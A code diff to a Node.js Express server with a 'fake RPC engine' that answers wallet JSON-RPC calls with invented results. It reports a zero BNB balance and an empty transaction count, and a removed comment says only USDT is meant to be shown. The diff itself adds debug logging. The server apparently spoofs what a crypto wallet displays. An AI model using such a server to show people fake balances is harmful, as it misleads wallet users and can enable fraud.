@@ -8,17 +8,19 @@ const port = process.env.PORT || 3000;
 
 // Static files serve karo (index.html ke liye)
 app.use(express.static(path.join(__dirname, '.')));
-app.use(express.json());
 
-// Root route ke liye index.html serve karo
+// Explicit GET / route for index.html
 app.get('/', (req, res) => {
     res.sendFile(path.join(__dirname, 'index.html'));
 });
 
+app.use(express.json());
+
 // Fake RPC Engine
 const engine = new JsonRpcEngine();
 engine.push((req, res, next, end) => {
-    // Fake BNB balance (0 FBNB, kyunki sirf USDT dikhana hai)
+    console.log('Received method:', req.method); // Debug log
+    // Fake BNB balance (0 FBNB)
     if (req.method === 'eth_getBalance') {
         res.result = '0x0'; // 0 FBNB
         return end();
@@ -31,7 +33,7 @@ engine.push((req, res, next, end) => {
             return end();
         }
     }
-    // Fake transaction count (history khali rakho)
+    // Fake transaction count
     if (req.method === 'eth_getTransactionCount') {
         res.result = '0x0';
         return end();
@@ -43,7 +45,11 @@ engine.push((req, res, next, end) => {
 const provider = {
     sendAsync: (payload, callback) => {
         engine.handle(payload, (err, result) => {
-            if (err) return callback(err);
+            if (err) {
+                console.error('Error in sendAsync:', err);
+                return callback(err);
+            }
+            console.log('Response:', result); // Debug log
             callback(null, result);
         });
     }
@@ -52,8 +58,12 @@ const provider = {
 // RPC endpoint
 app.post('/rpc', (req, res) => {
     provider.sendAsync(req.body, (err, response) => {
-        if (err) res.status(500).json({ error: err.message });
-        else res.json(response);
+        if (err) {
+            console.error('RPC Error:', err);
+            res.status(500).json({ error: err.message });
+        } else {
+            res.json(response);
+        }
     });
 });
 
